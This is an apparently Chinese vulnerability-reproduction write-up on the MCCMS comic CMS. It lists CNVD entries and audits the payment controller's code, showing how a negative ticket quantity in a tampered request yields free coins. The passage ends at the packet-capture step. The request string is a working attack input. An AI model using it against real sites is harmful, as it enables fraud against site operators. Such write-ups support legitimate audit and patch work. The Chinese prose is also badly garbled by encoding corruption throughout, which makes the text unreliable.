ä½œè€…ä¸­å¿ƒä¸»é¡µæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€renzheng.html ä½œè€…è®¤è¯æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€user è¯»è€…ä¸­å¿ƒç›®å½•<br>â”‚ â”‚  â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€left.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€right.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€index.html è¯»è€…ä¸­å¿ƒä¸»é¡µæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€bind.html ç¬¬ä¸‰æ–¹è´¦å·ç»‘å®šæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€buy.html æ¶ˆè´¹è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comic.html æ¼«ç”»è´­ä¹°è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comment.html è¯„è®ºè®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€fav.html æ¼«ç”»æ”¶è—è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€info.html èµ„æ–™ä¿®æ”¹æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€info_pass.html å¯†ç ä¿®æ”¹æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€message.html æ¶ˆæ¯åˆ—è¡¨æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€order.html å……å€¼è®¢å•è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€read.html é˜…è¯»è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€ticket.html æœˆç¥¨æ¶ˆè´¹è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€pay.html å……å€¼ä¸­å¿ƒæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€pay_cion.html è™šæ‹Ÿå¸å……å€¼æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€pay_ticket.html è´­ä¹°æœˆç¥¨æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€pay_vip.html å……å€¼VIPæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€reg.html ç”¨æˆ·æ³¨å†Œæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€login.html ç”¨æˆ·ç™»é™†æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€pass.html æ‰¾å›å¯†ç æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚â”€left.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚â”€right.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚â”€category.html æ¼«ç”»æ£€ç´¢æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€chapter.html æ¼«ç”»é˜…è¯»æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€comic.html æ¼«ç”»è¯¦æƒ…æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€comment.html æ¼«ç”»è¯„è®ºæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€error.html é”™è¯¯æç¤ºæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€index.html ä¸»é¡µæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€lists.html åˆ†ç±»é¡µæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚â”€search.html æ¼«ç”»æœç´¢æ¨¡ç‰ˆ<br>â”‚ â”œâ”€pic.png æ¨¡æ¿æ¼”ç¤ºå›¾ç‰‡æ–‡ä»¶<br>â”‚ â”œâ”€tpl.php æ¨¡æ¿ä¿¡æ¯æ–‡ä»¶<br>â”‚â”€tempalte&#x2F;[pc&#x2F;wap]&#x2F;2&#x2F; æ¨¡æ¿2<br>â”‚â”€â€¦<br>â”‚â”€template&#x2F;[pc&#x2F;wap]&#x2F;n&#x2F; æ¨¡æ¿N</p>
</blockquote>
<h3 id="ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£"><a href="#ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£" class="headerlink" title="ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£"></a>ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£</h3><p>å½“æˆ‘ä»¬åœ¨åå°é¡µé¢æ—¶ï¼Œä¼šå¼¹å‡ºæ›´æ–°æé†’ï¼Œåœ¨è¿™æé†’ä¸­æˆ‘ä»¬å¤§è‡´å¾—åˆ°äº†å‡ ä¸ªå·²çŸ¥æ¼æ´çš„å­˜åœ¨</p>
<blockquote>
<p>å½“å‰ç¯å¢ƒmccms v2.5.8</p>
</blockquote>
<p><img src="/post/CMS-Test/image-20221122212640814.png" alt="image-20221122212640814"></p>
<p><img src="/post/CMS-Test/image-20221122211650800.png" alt="image-20221122211650800"></p>
<p>åœ¨å®˜æ–¹æç¤ºæ›´æ–°çš„æ–‡æ¡£ä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°æ¶ˆæ¯</p>
<p>åœ¨å½“å‰<code>v2.5.8</code>ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨è‡³å°‘4ä¸ªæ¼æ´</p>
<blockquote>
<p>1.ä¿®å¤äº†å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·<br>2.ä¿®å¤äº†ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´<br>3.ä¿®å¤äº†SQLæ³¨å…¥æ¼æ´<br>4.ä¿®å¤äº†åå°ä¸€å¤„å®‰å…¨æ¼æ´</p>
</blockquote>
<h2 id="CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯"><a href="#CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯" class="headerlink" title="CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯"></a><code>CMS</code>å·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯</h2><p><code>CNVD-2021-51411</code>ã€å±å®³ä½ã€‘</p>
<table>
<thead>
<tr>
<th>å…¬å¼€æ—¶é—´2021-08-18</th>
<th>æŠ¥é€æ—¶é—´2021-07-06</th>
</tr>
</thead>
<tbody><tr>
<td>æ”¶å½•æ—¶é—´2021-07-16</td>
<td>æ›´æ–°æ—¶é—´2021-07-16</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>å½±å“äº§å“æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ æ¼«åŸ<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<p><code>CNVD-2021-48907</code>ã€å±å®³é«˜ã€‘</p>
<table>
<thead>
<tr>
<th>å…¬å¼€æ—¶é—´2021-08-12</th>
<th>æŠ¥é€æ—¶é—´2021-06-28</th>
</tr>
</thead>
<tbody><tr>
<td>æ”¶å½•æ—¶é—´2021-07-09</td>
<td>æ›´æ–°æ—¶é—´2021-07-09</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>å½±å“äº§å“æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ æ¼«åŸ<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>CNVD-2021-51867</p>
<p>ä¸­å± Mccmså­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´</p>
<p>æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<blockquote>
<p>CNVD-2021-51492</p>
<p>ä¸­å± Mccmså­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´</p>
<p>æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<blockquote>
<p>CNVD-2021-51860</p>
<p>ä¸­å± Mccmså­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´</p>
<p>æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<h2 id="æ‰¹é‡ä»£ç å®¡è®¡"><a href="#æ‰¹é‡ä»£ç å®¡è®¡" class="headerlink" title="æ‰¹é‡ä»£ç å®¡è®¡"></a>æ‰¹é‡ä»£ç å®¡è®¡</h2><p><code>Seay</code>ä»£ç å®¡è®¡</p>
<p><img src="/post/CMS-Test/image-20221122165423902.png" alt="image-20221122165423902"></p>
<p>ç”±æˆ‘ä»¬å¯¹æ›´æ–°æ–‡æ¡£ä¸­çš„ä¿¡æ¯ä»¥åŠç›®å½•ç»“æ„çŒœæµ‹è¿™äº›æ¼æ´å¤§æ¦‚å‡ºç°åœ¨å“ªäº›ä»£ç å¤„</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="1-å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·"><a href="#1-å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·" class="headerlink" title="1.å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·"></a>1.å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·</h3><blockquote>
<p>å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·<br>çŒœæµ‹ä¸ºæ”¯ä»˜æ¼æ´<br>å¸¸è§å¤§è‡´æœ‰4ç§ï¼Œä¿®æ”¹å•ä»·ï¼Œä¿®æ”¹æ€»ä»·ï¼Œä¿®æ”¹è´­ä¹°æ•°é‡ï¼Œä»¥åŠé‡å¤å‘åŒ…å¯¼è‡´ä»¥å°‘é‡çš„é’±å®ç°å¤šæ¬¡è´­ä¹°</p>
</blockquote>
<h4 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>æŸ¥çœ‹æ”¯ä»˜ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php </span></span><br><span class="line">  <span class="comment">//é‡‘å¸</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;cion&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">20</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">30</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">50</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//VIP</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;vip&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb1,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;æœˆåº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ30å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">90</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb2,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;å­£åº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ90å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">180</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb3,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;åŠå¹´VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ180å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">365</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb4,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;å¹´åº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ365å¤©&#x27;</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//æœˆç¥¨</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;ticket&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">5</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ä¸Šé¢ä¸‰ä¸ªæ•°ç»„å®ç°äº†rmbï¼Œé‡‘å¸ï¼Œæœˆç¥¨ï¼Œvipä¹‹é—´çš„å…‘æ¢ç‡*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ”¯ä»˜æ–¹å¼</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_wxpay&#x27;</span>] = Pay_Wx_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_alipay&#x27;</span>] = Pay_Ali_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_qqpay&#x27;</span>] = Pay_QQ_Mode;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä¸»è¦æ˜¯å¯¹æ•°æ®ä¹‹é—´å…³ç³»çš„å®šä¹‰ï¼Œå…³é”®åœ¨ä¸‹æ–¹ä»£ç ä¸­ï¼Œå¦‚ä½•è®©æˆ‘ä»¬çš„æ¶æ„è®¢å•æˆåŠŸå¹¶å…¥åº“</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line"> <span class="comment">//å……å€¼è®¢å•å…¥åº“</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;type&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$pay</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;pay&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$rmb</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;rmb&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">    <span class="variable">$day</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;day&#x27;</span>);</span><br><span class="line">	<span class="variable">$card</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;card&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$dayarr</span> = <span class="keyword">array</span>(<span class="number">30</span>,<span class="number">90</span>,<span class="number">180</span>,<span class="number">365</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$day</span> == <span class="number">0</span>) <span class="variable">$day</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; (<span class="variable">$rmb</span> == <span class="number">0</span> || <span class="variable">$rmb</span> &gt;<span class="number">9999</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;é‡‘é¢é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; <span class="variable">$rmb</span> &lt; Pay_Rmb_Min) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;æœ€ä½å……å€¼é‡‘é¢&#x27;</span>.Pay_Rmb_Min.<span class="string">&#x27;å…ƒ&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span> &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;æœˆç¥¨æ•°é‡é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span class="comment">/*è¿™é‡Œæœ‰ä¸ªå¾ˆæ˜æ˜¾çš„æ¼æ´å°±æ˜¯ï¼Œå¯¹æœˆç¥¨æ•°çš„é™åˆ¶åªæœ‰ä¸ä¸º0ï¼Œè€Œå¯¹äº&lt;0çš„å€¼ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥ç»•è¿‡*/</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;card&#x27;</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$card</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;å¡å¯†ä¸èƒ½ä¸ºç©º!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;vip&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$day</span>, <span class="variable">$dayarr</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;Vipæ—¶é—´é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span class="variable">$parr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cion&#x27;</span>,<span class="string">&#x27;wxpay&#x27;</span>,<span class="string">&#x27;alipay&#x27;</span>,<span class="string">&#x27;qqpay&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$pay</span>, <span class="variable">$parr</span>)) <span class="variable">$pay</span> = <span class="string">&#x27;cion&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>é‡‘å¸æ”¯ä»˜ä»£ç æµç¨‹åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line">        <span class="comment">//é‡‘å¸æ”¯ä»˜</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pay</span> == <span class="string">&#x27;cion&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­é‡‘å¸æ˜¯å¦ä¸è¶³</span></span><br><span class="line">            <span class="variable">$cion</span> = <span class="variable">$rmb</span> * Pay_Rmb_Cion;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$cion</span> &gt; <span class="variable">$user</span>[<span class="string">&#x27;cion&#x27;</span>]) <span class="title function_ invoke__">get_json</span>(Pay_Cion_Name.<span class="string">&#x27;ä¸è¶³ï¼Œè¯·å…ˆå……å€¼!!!&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//è´­ä¹°æœˆç¥¨</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;ticket&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;ticket&#x27;</span>]+<span class="variable">$num</span>;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;è´­ä¹°æœˆç¥¨æˆåŠŸ&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;æ‚¨èŠ±è´¹&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;ï¼ŒæˆåŠŸè´­ä¹°äº†&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;å¼ æœˆç¥¨&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;è´­ä¹°VIPä¼šå‘˜æˆåŠŸ&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;æ‚¨èŠ±è´¹&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;ï¼ŒæˆåŠŸè´­ä¹°äº†&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;å¤©Vipä¼šå‘˜&#x27;</span>;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;vip&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//åˆ¤æ–­èµ é€å¤©æ•°</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="variable">$day</span>/<span class="number">30</span>) &gt; Pay_Vip_Month)&#123;</span><br><span class="line">                	<span class="variable">$sday</span> = (<span class="keyword">int</span>)((<span class="variable">$day</span>/<span class="number">30</span>) - Pay_Vip_Month);</span><br><span class="line">                	<span class="keyword">if</span>(<span class="variable">$sday</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                		<span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$sday</span>;</span><br><span class="line">                		<span class="variable">$text</span> .= <span class="string">&#x27;ï¼Œç³»ç»Ÿèµ é€æ‚¨&#x27;</span>.<span class="variable">$sday</span>.<span class="string">&#x27;å¤©&#x27;</span>;</span><br><span class="line">                	&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å®ç°æœˆç¥¨åå‘å……å€¼é‡‘å¸çš„å‰æç»•è¿‡å°±ç®—è¿™ä¸ªå¯¹é‡‘å¸æ•°é‡æ˜¯å¦å……è¶³çš„ç»•è¿‡ï¼Œ<code>$cion</code>ä¸­<code>rmb</code>æ˜¯é»˜è®¤å¤§äº<code>Pay_Rmb_Min</code>è¿™ä¸ªå…¨å±€å˜é‡å€¼ä¸º<code>1</code>ï¼Œè€Œ<code>Pay_Rmb_Cion</code>ä¹Ÿæ˜¯é»˜è®¤ä¸º<code>10</code><br>è€Œ<code>$user[&#39;cion&#39;]</code>æ˜¯æˆ‘ä»¬è‡ªå¸¦çš„å¼€å§‹é‡‘å¸æ•°ï¼Œå…¶ä¸­æˆ‘ä»¬èƒ½æ§åˆ¶å¾—å‚æ•°å°±åªæœ‰<code>rmb</code>ï¼Œä½†å…¶å®è¿˜æœ‰<code>num</code>ã€‚</p>
<p>å½“æˆ‘ä»¬è´­ä¹°1å¼ æœˆç¥¨æ•°æ—¶ï¼Œ<code>rmb</code>ä¸º<code>ï¿¥1</code>ï¼Œä½†å½“æˆ‘ä»¬è´­ä¹°<code>-1</code>å¼ æœˆç¥¨æ—¶å‘¢ï¼Œå› ä¸º<code>rmb</code>ä¸ºçœŸï¼Œå·²ç»é€šè¿‡äº†å…¶åˆ¤æ–­ï¼Œä½†æ˜¯å½“<code>num</code>è®¡ç®—æ€»é‡‘é¢æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹<code>numå€¼</code>çš„é€»è¾‘æ€§è¿›è¡Œåˆ¤æ–­ï¼Œ<br>å› æ­¤<br>&#x3D;&#x3D;&gt;<br>å½“<code>type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion</code><br>ã€èŠ±è´¹<code>rmb=1*10</code>ç­‰ä»·é‡‘å¸ä¹°æœˆç¥¨ï¼Œä¹Ÿå°±æ˜¯èŠ±è´¹100é‡‘å¸ä¹°10å¼ æœˆç¥¨ã€‘<br>æ”¹æˆ<br><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion</code><br>ã€èŠ±è´¹<code>rmb=1*(-10)</code>ç­‰ä»·æœˆç¥¨ï¼Œä¹Ÿå°±æ˜¯èŠ±è´¹10æœˆç¥¨ä¹°100é‡‘å¸ï¼Œç›¸å½“äºèŠ±-100é‡‘å¸ï¼Œä¹°-10å¼ çš„æœˆç¥¨</p>
<blockquote>
<p><strong>é‡‘å¸&#x3D;é‡‘å¸-(-10)</strong></p>
<p>  <strong>æœˆç¥¨&#x3D;æœˆç¥¨+(-10)</strong></p>
</blockquote>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>å…ˆç»™æˆ‘çš„è´¦æˆ·ä¿®æ”¹ä¸€ä¸‹é‡‘å¸æ•°</p>
<p><img src="/post/CMS-Test/image-20221124135152005.png" alt="image-20221124135152005"></p>
<p>ç„¶åè´­ä¹°æœˆç¥¨æŠ“åŒ…çœ‹çœ‹æ•°æ®</p>
<p><img src="/post/CMS-Test/image-20221124135229059.png" alt="image-20221124135229059"></p>
<p><img src="/post/CMS-Test/image-20221124135257569.png" alt="image-20221124135257569"></p>
<blockquote>
